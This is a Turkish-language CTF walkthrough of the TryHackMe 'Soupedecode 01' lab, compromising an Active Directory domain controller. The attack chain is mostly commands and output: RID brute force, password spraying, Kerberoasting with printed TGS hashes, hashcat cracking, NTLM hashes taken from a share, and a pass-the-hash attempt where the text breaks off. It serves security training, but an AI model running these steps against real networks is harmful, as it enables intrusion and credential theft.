---
title: THM - Soupedecode 01
author: Acivik
date: 2026-07-02 09:00:00 +0300 
categories: [CTF, TryHackMe]
tags: [tryhackme, ad, active directory, writeup, ctf, walkthrough, windows]
---

# Enumeration

İlk olarak klasik bir TCP port taraması gerçekleştiriyorum.

```bash
┌──(root㉿kali)-[~/thm/soupedecode]
└─# nmap -p- -Pn -sV -sC -T4 10.114.157.19 -vv -oN tcpscan

53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-06-07 13:24:47Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
|_ssl-date: 2026-06-07T13:26:16+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   DNS_Tree_Name: SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2026-06-07T13:25:36+00:00
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Issuer: commonName=DC01.SOUPEDECODE.LOCAL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-06-06T13:17:47
| Not valid after:  2026-12-06T13:17:47
| MD5:     fc79 6f2d 7bdd 9689 7ea7 c7ac 613d e47f
| SHA-1:   0fb7 739c beb4 2917 9a68 ec91 b6cf 6a19 2318 42b7
| SHA-256: dd9c b78a 1d4f cc32 d59c 08a0 00ce 5260 f84d c1be 0ae1 901b 3c62 5852 dfa1 4aa1
| -----BEGIN CERTIFICATE-----
| MIIC8DCCAdigAwIBAgIQa7NaENJqTJNLEJx5aiFBTjANBgkqhkiG9w0BAQsFADAh
| ...
|_-----END CERTIFICATE-----
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49735/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49852/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2026-06-07T13:25:37
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 44597/tcp): CLEAN (Timeout)
|   Check 2 (port 43041/tcp): CLEAN (Timeout)
|   Check 3 (port 9560/udp): CLEAN (Timeout)
|   Check 4 (port 53753/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
                                                                                                                     
┌──(root㉿kali)-[~/thm/soupedecode]
└─#

```

Tarama sonucunda dikkat çeken servisler:

- DNS (53)
- Kerberos (88)
- LDAP (389)
- SMB (445)
- RDP (3389)

LDAP ve Kerberos servislerinden hedefin bir **Active Directory Domain Controller** olduğu anlaşılıyor.

```
Domain : SOUPEDECODE.LOCAL
Hostname : DC01.SOUPEDECODE.LOCAL
```

`/etc/hosts` dosyasına domain bilgisini ekledikten sonra enumerate işlemine devam ediyorum.

---

# SMB Enumeration

İlk kontrol ettiğim nokta SMB oluyor.

Çoğu zaman sistem yöneticileri, Guest hesabını devre dışı bırakmayı unutur veya yanlış yapılandırırlar. Bu da null session üzerinden RID brute force yapmamıza izin veriyor:

```bash
┌──(root㉿kali)-[~/thm/soupedecode]
└─# nxc smb 10.114.157.19 -u 'Guest' -p '' --rid-brute | grep User | cut -d "\\" -f 2         
Administrator (SidTypeUser)
Guest (SidTypeUser)
krbtgt (SidTypeUser)
Domain Users (SidTypeGroup)
Protected Users (SidTypeGroup)
DC01$ (SidTypeUser)
bmark0 (SidTypeUser)
otara1 (SidTypeUser)
kleo2 (SidTypeUser)

```

Binlerce kullanıcı var usernames.txt olarak kaydedeceğim.

```bash
nxc smb 10.114.157.19 -u 'Guest' -p '' --rid-brute | grep User | cut -d "\\" -f 2 | awk '{print$1}' > usernames.txt
```

Artık elimizde kullanıcı listesi bulunuyor.

---

# Username = Password Kontrolü

Basit ama oldukça etkili bir teknik olan **username:username** kombinasyonunu deniyorum.

```bash
┌──(root㉿kali)-[~/thm/soupedecode]
└─# nxc smb 10.114.157.19 -u usernames.txt -p usernames.txt --no-bruteforce                            
SMB         10.114.157.19   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:Administrator STATUS_LOGON_FAILURE
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\DC01$:DC01$ STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\bmark0:bmark0 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\otara1:otara1 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\kleo2:kleo2 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\eyara3:eyara3 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\pquinn4:pquinn4 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\jharper5:jharper5 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\bxenia6:bxenia6 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\gmona7:gmona7 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\oaaron8:oaaron8 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\pleo9:pleo9 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\evictor10:evictor10 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\wreed11:wreed11 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\bgavin12:bgavin12 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\ndelia13:ndelia13 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\akevin14:akevin14 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\kxenia15:kxenia15 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\ycody16:ycody16 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\qnora17:qnora17 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\dyvonne18:dyvonne18 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\qxenia19:qxenia19 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\rreed20:rreed20 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\icody21:icody21 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\ftom22:ftom22 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\ijake23:ijake23 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\rpenny24:rpenny24 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\jiris25:jiris25 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\colivia26:colivia26 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\pyvonne27:pyvonne27 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\zfrank28:zfrank28 STATUS_LOGON_FAILURE 
SMB         10.114.157.19   445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
                                                                                                                     
┌──(root㉿kali)-[~/thm/soupedecode]
└─# 
```

Sonuç:

```
[+] SOUPEDECODE.LOCAL\ybob317:ybob317
```

İlk geçerli domain hesabını elde etmiş oldum.

---

# Kerberoasting

Domain kullanıcısıyla artık SPN sahibi servis hesaplarını sorgulayabiliyorum.

```bash
┌──(root㉿kali)-[~/thm/soupedecode]
└─# impacket-GetUserSPNs soupedecode.local/ybob317:'ybob317' -dc-ip 10.114.157.19 -no-pass -request
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------  --------------  --------  --------------------------  --------------------------  ----------
FTP/FileServer          file_svc                  2024-06-17 13:32:23.726085  2026-06-07 09:59:15.222452             
FW/ProxyServer          firewall_svc              2024-06-17 13:28:32.710125  <never>                                
HTTP/BackupServer       backup_svc                2024-06-17 13:28:49.476511  <never>                                
HTTP/WebServer          web_svc                   2024-06-17 13:29:04.569417  <never>                                
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 13:29:18.511871  <never>                                



[-] CCache file is not found. Skipping...
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$soupedecode.local/file_svc*$5f891c8e99e4d32724615372d69bc201$ab83dda467009ce70aca35cad7051be0791476688837769d96d50079ee50c39495552f0e708e022de2c8ac2f434c802fdf963eb94fac1e8425326f0bda027ed090327f5f05aa10a64292372f6d226733e7c62c1c3fed544501a5437c6ca28d21544af930aab09cde95c8097429b5d3d89e7a354510a6d7ec385c426d97f6cac2f00ef35eca0ad755911e8c96d596ecff789e8027510c9d88f8405e2f7277f42d8f2d6c6b18cf1cfa2e6f417a407abc738cf3c3727c7d8ee8ed2a3674b63f32f528048c9895dd16792095c6882c51aa664d645bfc7b1224dcdd5ad6cb3d77af4671395a9ac0be2889a1eb35a321e3ffce9ee44b5615b1e92e1b8b9c611e57af92560e39ed387904e2fdaf72b7e2c461976e9f618ddf939753b65d7edf7e14e897f86cf16e0970d711363d652e54a1172e3c1d4ea097258898834a852a236ac133f7bb4cc25dbc76fa20f26757f180c7a5830222e6d3d6202a633e5f1838c97852eef826345c7a99f6418e6b69b2cc8419dc747cd71072fa3f6727c9e1cd6534415685161eccecd111f4367786f7ca680b834f7604fc4d5b764d4aecc7a6e09993b2424b89b7062f74bb1c6e174982898763ccf79e3d2c7a73e2f463d9f9f2317ff7af3213ae8284526360ccada2a140f6bf49504f87f2679ddefe61fa22c4e117bd32ea3a152039e2f68384bca11988cd4873b4ed398100e9636573bda6829e976588c7185b52a503114ef19726372c9228f747b3678ce42e64dd692568d21b2b4550e541ff114df920d973df87cca13e2cbd8691aba522693f4b590b0d6e8cf083d6814a259735066282abcb26130ecdf8a92aeda03c42561a0c536cc2e6412742219f9ad4195f664120a9619ede977936209b52efa72608cb296b1ad1aab1e50c5bedfc5db9a83a36c45072ecfbf8e010ef8fa4efc29ec2b5d03b57e1229008a503aebca3c66c0915daf6a59fcd12fd33a257fac96f510613492fae889f99c3e420cec3d489f2fc06084fa8a764145c493a40ed0690e6cb147c2ce77f7065acc55c88f49d1e1ac9274aefd77fa05df248d2ab099b2fa85ae2c0ea7fba4c112fa01a7453ce33e9d711ecd21700f7ef800e2b321a5780af9de77febb655069b5048ecc29f846e642bec45e8d45a7602a36e2aeba7a99bdab2cbd3a86c2a1210ae06781110ac2a229b35ad41060f3aa2c80737369e256319a36e774c486afbfdc7ed9649774c5f41e62bd3c21ef1f8c16e7488626178dfe941891662c81d553043ad7c6c4efe3b0e5283e89ee0d689d371a91a0a24776da1481b3fdd44a79374f15555233f0cb374c0cf5f720714953e1f6ecc2eb610b2c2991ba266ee028d09b2aba930c2630c3ddc668206a2ba1099c6e0f16336f7c7a846c5b8cd7df9e8e6655296b679c5b1a2dc1067a8a5bad5f2177cf2c92e216206a34218ebfc8116ed46fc41561128364bb812ca323e2470aa57f9788ceb65a749cc41581cf97f33936e4c
$krb5tgs$23$*firewall_svc$SOUPEDECODE.LOCAL$soupedecode.local/firewall_svc*$103f1b87bb88dcbcabb4c4b2211ff9b2$46adbe9b05b9d261a1f360e66af3e39235676e5e8cd44b6a2b36a35499a06a3221bf66d1c16d7fa18bf748f4ba2e0eeb3625a15463f6409ee771d95a9d01b3b7558dff3a29096ac893acac88334fa8e1372e85df9897c99dcbc27c38b46ea7d986c5376da10ff4cfe0f3697c7bafcd4d3297c2a3d2ab118614b1a30f79dd970e28715832408919fca728454cb6c89382b3f097bfd5b8b8784640e223cb31ce223088ba1258ad2c07222e4b9812864e09948dbc9412b3b6e0a9512db0173c683afe8f45a2d38f864a557337ffd3e9c7ad728c94e6d1b829bc0357e7bdededc71b5040e871c1811fac95d485976192fe440cf164d775321de5c49f6b8bc5389d20124f3f77a3cf57b8c27963bf528ded0f75b4ccb8fc197b7a87f6d8d8d2b0598a87fd1fd114d1138b1cdb95b864e9b7d2e257bc731b18a6aad1e25750246c8b03f4497e022958513220c34e5259ea1c239de73c0f25c12e634560df0ba1039b0eb143624ef2095ae0dc075ab2c4bd7288b0c962980752f8f51a55df00992c0803244047a8ea2d0f52be7bbf467408af84c334ae32e9fcae8797b13ffdf6ddabc79f53e9c77b2c57ded17d524db5ef3f1b47a4e476d55471ce660ab8d48c18ed090db93edae5ef5a4bf563278c4fa32385af46d97221dea79460f9781026f3a58db3a30e36240de5cc14c707bb5365c3501b56805461991d5aafcd136274975119e5847b905d5d4637eb59545b59cbda141545d78fff725dfb026f3cb997f4518a6927d96b78c98d033a35d500423e5c0ea2f79ad07e13b81d7b060aa9135b12a27f36effbe8a442e6c7e696bb5565843db75698d9128df42e7a908f907841e079bc86bdcb942d5b546ea031649fdb21251299ecf4cbe70244ab21448fea0b2cd98913fb60d558cb5345d6032ad2a9bf623a5ae9e8d6c7ab20dee8423c8c7f0b694d4436674546bc0d8701975b910addf3983b20ec34b172b390a23eebde7b2dbcd801cd3c7599ec5a359a808e7b33fdeb0f6e6333c345d533e9fc4b100f671ee21d27b5655fb10441f93860582196210eb75d50b041521222785007a079691a9fb9dee0a9fe3d258d42615d01ce1134e99085068b5ced3da82144a27daaa8043ba85f564f6f64c8428736c6ae69f5f67c16554d3749167ab0349dde8db5d1654f552ddc35b5bac04613f6085890df4e4653a649d23863e72bf1db19883d621c8c8b21ab9e177ef340d4d4a9ba2f91c30175c9722d6c5d9ca1e4a1a9ab71731ab54b6c29832e3725191aa3b5cfc5ac6cf68b74eda9c5e3fd64ce5ed404b953a3ee9e1d19549010bb14f2f81a362f39f6e66d3de07290096811bcbe425606c0a17ef6ab5a5a76237fe9bfa08f7ccbdbeca9b233aa8269fb48dc5ee23fbcfe76197a1c9166535ddfa44cf05002e40f97500f40ad33952a005fb003fa292329d2bff9cf734b055f0a8aadf004beb732e4263ca45f57d2cd5444f9ba5a10e1aca1d175ce
$krb5tgs$23$*backup_svc$SOUPEDECODE.LOCAL$soupedecode.local/backup_svc*$98444fa97797556544feb46a69f852a6$87cc5708c4bed2fffc4a526f2abfc13a5ab6e8e3deaf6a873bad320e276500aee4bead2a6e111f92cecc7e2fe906aa014a3a432def9ace7438e62ac4b9d4aecc584554ad972d030079ee50b52991dae37b84ddaabb45eafac9c055a6b80fde6c5272354885b435f77e53b5d6f5e42152cafd3262b09bb5ca8e92f0fc6a51ddf4dfc33295ff721cbb70ebdf295f38d269702f0bdb79534774be0b48fdf4594d1d5bcb94a7221f6cb581da7c6844c89dbd1cf1ea58a8145233e20364a5b682d7d89c49595e1dc2635ae3d61040082e6aa2825de914cd69f90fe0faafaf3001a3ca4e15b19289bf1f7c2b5abaa7cdb1cbfb85dd74da1bffc6ff6721c21e8eca5283d4dce9f7f23aa0227ac584685fed3f10454c469fa8eca29a09099146ac1ca3602b2f1ad467be76d0bb41d05f2194c96a1a033334311d66982d73f5528b93576a53466dbd4b1efa88237e5a5cf40b884819a582a3f208690eac1fcf550c6286bdf47dce870ad77af0b4b72d446a934b7845801e81186f0f596847bc6c640e418fe5a810f4239825364523ae46a449f926135e41bb06083b3cd8e1a3a92e360f63927bdb01614b8a56bf85c971fc3fe5aaf1eb9a4ac14ad6e40888c47540187b37f414744c0f1eb7edc56c337afa6dab0eb7feb7e93337b2f73aced4faf381deac27e3abce205103b0e31ae44f6dd079093a18303c481b6df89791236ffe3a04956dba092113fc42989496a4aa153540c2489e81c4b5fae0894caed31ba3345a1ee112a53d9e6b14b2189e1dbf85514a64a154c8fb9b91fe4841e72cbf3f194e1a54675302c8b2dfd7c72799cad3f8e2433f923e9f88a9b71bc1322c9f564c22dd129d3c8521ca2034fffe24edaff9479f212555fa8d211f3d08d4c3f805f9d894055f4259459ff3b081e0fec9e41e7fecd7cf7a23ad7eb1a364f0ad0642ea4a44530630581170d6fc3b64f251352211c72dac76d34813b8b3488bccc634797bf4dbae6c2b614855f592a3b2aaf31d1fd1aeb518ca6706818aed187645a9cbaa5030e63f2183e49e5cc37be146a012bd7892fbd87b05613ea3e76669b4e39cc13ad52687e717a153247f6e758d386ffb42aca14c5b93554b816032c7de2085bc78a44b12bd8d21062f3fa63a61d0be947fb4fc8c8e263f5ca9c731dd56e5ac0fa24d8661192c31709601f9493006c7409846e44727f368973f8349f3c26e4e0ebf19b5413b9c09f7f3ce26a8c5022a60fb0bd9c2611858d236bc87f07493163b577c02b37bf0a964617a8e4849a09d97cf9398ce7a7ff1ec49fd412393363086295fdf9585e6896d0e178a7a753484207963ef8588331277e59ffcaadfd0a92689adebd4364d1433896fd36068c5f6f17943924feef2f37f84bb3245d7395a5613e20be9fa15d0b522ed01e0392b3e78b2cbce9fc2e5445d44dfe99c144dd3dabca8b6ed4bcaa2830aadd728dbbab5b8ff4f348516b46f94a35be379b8869189d712
$krb5tgs$23$*web_svc$SOUPEDECODE.LOCAL$soupedecode.local/web_svc*$2d5092556cc3af9791093ec8989c6e9f$da4905e290ac7e92e915767a730beae9284a04b7785780fb81b659c784d93c478a6deab3ea801b65525ca7e8e91259a0d2a495de07e768dda278bbf8a37aab00a40b4bf02d2a839c88da5b65faa682f0c9a089dd06e31cf843072347e0b0ff379e063ac8e446445cfc54c45174c3348428eabf0c687733b6483300df8316e07c4414159003e7ddd93537fb6570b5f8210d648fe31d364d80e699b99ecaeb0f1cd5e0a720785747bf4fedc731844ee09c2a9dfcab64887e35f4ba1b036b61c8c4f72e8496e792e1ff8a3499c9b07a08648772d5b298456acd9be31fcfd6d5b3f746730015e1a55e0596d2794ec1cd09fad63a0590c5585dab66847b1619ad3004e2b5f17321d304e22df00715207bfb09e709ff5352eceb8f3647ad226cd0037f56ead76794186c3eb7035b35bc5af0d65cc0fdc23fac898f5be4c59ec6bbc6c79c17db701d5bbaddcc1da5a2331e17814e103c41aeb924ec068131665cf68e6d78f40f842e75f7cfb4499c1377d526b9fa3ebf89bcaf4687504c4b807e6f73d93bbf196149617ae9d546d6bc80d73fb6a639f321e3d893b35e008d4dd4be3fe03353102208e87d987b6e1a32fbe505d6434af60321ed568c9cbf85f79b65ed8bac5b810bb9ced10bb7bb5662ca4fd9e558108c535ad022d597d197cfca788d5d9281999f883c2f59c8573833abb80367a2bda067d6f350211398f0febe0bd05f80516b8b3229c6e717cb943298e8c0e806603aa4c913b9e197fcce68c007b09de754f110d7cf30f55d37e7dc43fa80ecb2e7f7bc562805476aad87c594c648ecf8ab9d6cd8d932720fba41954c490ec2d0f4ed0c63fe8bfe697865c8f7f9a6920e8ff80892edf23e88c4cea400856e2026013405bc70c8306234894b3f746c01e211aaedcc74791385d86686a002c2db350a589d2d6ff1f32dd5c74f4fcfa9c7e7d10cd050a4d828b9c6b7c8532adc8f598b75d3335abfc3be41ccab196f5e75a4ad67a2d160d869a7da10e5a7258a3f0a286081e9686ac7bbbda112751c07c2f18c0af509f122914e27c87a4e48e8fe0a40cf56f6f6665a6a4d195d21525bcffe89b6dcee385adec97d45fa4e61b478c75940efacb3239c850c615472301207aa1e63f84a1cf235f68ff41a98c78021cd96d9e0e28c4e9c5dc4e48c72b79b982fe1b13153ac41a77ad9e860a991310f33d15019ff81cf70361808f1bcc622da393f469d59477f2b0f8577e46579336f65c52b4ec322e3d29656640db590eb4da0d40e1ae8c2fc9597185451b19dd02f7938bdb07d9b2e3a9a03d1bdef69d74998aed531b05f9ca0e30505b0f68b037a6f6ef3c34c910a38eb3fbcc9bf7849532b5b85df58b61a3cf15245cd6c82e738d92ba6e618f6c0feae798e952600fedf42ed71aa7aeae35f5287eddc81ecbb376b102fc3d33633b386cea84097f49dc64e5064075b5642d93a6303285bc1eb5f877857d2ffd23004c191044cea1b651cf2
$krb5tgs$23$*monitoring_svc$SOUPEDECODE.LOCAL$soupedecode.local/monitoring_svc*$1e9a5a37ffeb6254b7454c851af174cf$29a846b826fe12e71d1f647806c836d4a44b2bc5b4c71bb8d985ae2bcf9567841df6f1c3cacb6933dc66ffbab84a36eac2da8a42c9b92f5c24d8187802eab837bd3c0d09fa63df8e832e80103c32e3300556fce7219bb3cc74e4283252709d1571c5a0eb254294c1b1d7ef90a769451046c94649af4f3aa96282ac99d59f73957de35785d6180da06c77d0eea2b4594e8684a543c5393070a08b58d222d483ae54fa4a482493f832b6c4b4a978a1616bdb8a362c6ea2047b5f336a0ac1569c00f4ae740ea532ce6d9a661d1fdd26c26d4c9978a3a8dfcb26bd289ae32ec646afb54e840a7184ef849103ba9696c25af288790f6b39f4be4e352b0d2d0d3f62e0e9d1ab95a0951abd4fd2a01ff04aad8620f37a59b443931c5f2f0adfd84bc0ce4f038cd552274976a43b5f0b77c45a18cb2e766499bd5d206b37d9fe847c7c0671146d433cd0eb3e8e8051856eacbe4cbafe44eb5d9c9ac2634dc30d68af2d009938494d1d264f46c4dcf2e7f29a1284505196af5a44be6e045a5b49403fad5acf0cd9ef9301e2176443e5fc81393fcc63a19e9722d515d156392d5f5105cb70f611d518a3a0a6d09f5247c7650c3b59d89a2fc2b41b01d70477cc14ed7ea19dbbc73d40b86ec3971956c31d1bf3c20cd51606d9541afb189309a1eb731c2ad3e6eb896b10fe62a246b39eb0af5a2202ae84dbda525e606126630f29d27e462580c3d9411a684588e763a2533fb82c437b231e7aa204bf2f1868dea71c570eec9318810899b6177e325ec33fc44beceb3fafadeb78b29e6a0da2ea05d30dc9d5f00ab820fdb3759d1d5ea57eafbfd68662e83c918ab93451ca3c858fb507b07e6da0347eaa8705643dff142158be4b40b18ddba327a2219c2770f60a823671efeb59905267833333037313b7eaad245a6957b0ab953f57811b2814b6c3c6719ec1a8322fbf83d105defb85075a2add2736473ea2bb21e3e70da202a53095f6e6822ba467d64880c4abe3c6e81b6610d09ae0b8f0159a447ac59aecc26a6773ab7c155a486d0dfccdcc0458b59657d6272d5cb57be77a465109cedd46ac1c3aaf210820656d61f5a1295a48846272cfc14592c362dcda924270ede1ef81a873db6e00fed4a93626e9ba392f89e40276a1f7e0d298c6d78b3dbf7be6e53883f950b10cf537ebf8de9c24b8b56b9b3821533eef4d729988f5c21783a887967135963c84edb658f2123cce2baf83c6f1c9f5da93ee3a24f8973192e318914826d3fe25d387127df07f447731597acfada903d089b53d92f5c31a25baca9997d07a823aa6df4e4d7146b83614b88362f8effdc9389e8927735e50b618f4cdeb013468e1a92c1ab6615b5d26b616f29a898623dca9aad28abf94c3611b76725ac0ac2204dc658d61247b2fce8ecf4a56425100383f2ac9c0c1b73bb8cd7f6b9cfbdc12f663447cd0a121e37adb0a163af0b3887925608466fd0245bdd5004ade7a96055c
                                                                                                                     
┌──(root㉿kali)-[~/thm/soupedecode]
└─# 
```

Birden fazla servis hesabı Kerberoast edilebilir durumda.

- file_svc
- firewall_svc
- backup_svc
- web_svc
- monitoring_svc

Araç ilgili TGS hashlerini döndürüyor.

Hashleri Hashcat ile kırıyorum.

```bash
hashcat -m 13100 hashes.txt wordlist.txt
```

Sonuç:

```
file_svc : Password123!!
```

Artık elimde bir servis hesabı bulunuyor.

---

# SMB Shares

Yeni elde ettiğim hesap ile paylaşımları enumerate ediyorum.

```bash
┌──(root㉿kali)-[~/thm/soupedecode]
└─# nxc smb 10.114.157.19 -u 'file_svc' -p 'Password123!!' --shares
SMB         10.114.157.19   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.114.157.19   445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!! 
SMB         10.114.157.19   445    DC01             [*] Enumerated shares
SMB         10.114.157.19   445    DC01             Share           Permissions     Remark
SMB         10.114.157.19   445    DC01             -----           -----------     ------
SMB         10.114.157.19   445    DC01             ADMIN$                          Remote Admin
SMB         10.114.157.19   445    DC01             backup          READ            
SMB         10.114.157.19   445    DC01             C$                              Default share
SMB         10.114.157.19   445    DC01             IPC$            READ            Remote IPC
SMB         10.114.157.19   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.114.157.19   445    DC01             SYSVOL          READ            Logon server share 
SMB         10.114.157.19   445    DC01             Users                           
                                                                                                                     
┌──(root㉿kali)-[~/thm/soupedecode]
└─#
```

Dikkat çeken paylaşım:

```
backup
```

Okuma yetkimiz bulunuyor.

Bağlanıyorum.

```bash
┌──(root㉿kali)-[~/thm/soupedecode]
└─# smbclient //10.114.157.19/backup -U 'file_svc'                                                     
Password for [WORKGROUP\file_svc]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jun 17 13:41:17 2024
  ..                                 DR        0  Fri Jul 25 13:51:20 2025
  backup_extract.txt                  A      892  Mon Jun 17 04:41:05 2024

		12942591 blocks of size 4096. 10704456 blocks available
smb: \> get backup_extract.txt 
getting file \backup_extract.txt of size 892 as backup_extract.txt (3.1 KiloBytes/sec) (average 3.1 KiloBytes/sec)
smb: \> exit
                                                                                                                     
┌──(root㉿kali)-[~/thm/soupedecode]
└─# cat backup_extract.txt 
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
                                                                                                                     
┌──(root㉿kali)-[~/thm/soupedecode]
└─#
```

İçerikte tek bir dosya bulunuyor.
İçeriği incelediğimde NTLM hashleri görüyorum.

Bu dosya Active Directory içerisindeki **machine account** hashlerini içeriyor.

---

# Pass-the-Hash

Hashlerin halen geçerli olup olmadığını test ediyorum.

```bash
┌──(root㉿kali)-[~/thm/soupedecode]
└─# nxc smb 10.114.157.19 -u 'BackupServer$' -H '46a4655f18def136b3bfab7b0b4e70e3'                     
SMB         10.114.157.19   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
